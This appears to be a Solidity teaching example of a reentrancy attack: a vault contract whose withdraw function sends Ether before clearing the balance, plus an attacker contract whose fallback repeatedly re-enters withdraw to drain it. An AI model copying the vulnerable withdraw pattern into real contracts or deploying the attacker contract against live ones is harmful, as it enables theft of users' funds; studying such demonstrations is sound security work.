// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract Store{
    mapping (address => uint) public balances;
    
    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalanceOfThisContract() public view returns(uint256){
        return address(this).balance;
    }

}



contract Reentrancy{
    Store public store;
    constructor(address _StoreAddress){
        store = Store(_StoreAddress);
    }

    //we need 2 functions to do reentrancy attack fallback() and attack()
    fallback() external payable{
        if(address(store).balance >= 1 ether){
            store.withdraw();
        }
    }
    function attack() external payable{
        require(msg.value >= 1 ether);
        store.deposit{value: 1 ether}();
        store.withdraw();     
    }
    
    function getBalanceOfThisContract() public view returns(uint256){
        return address(this).balance;
    }

 
}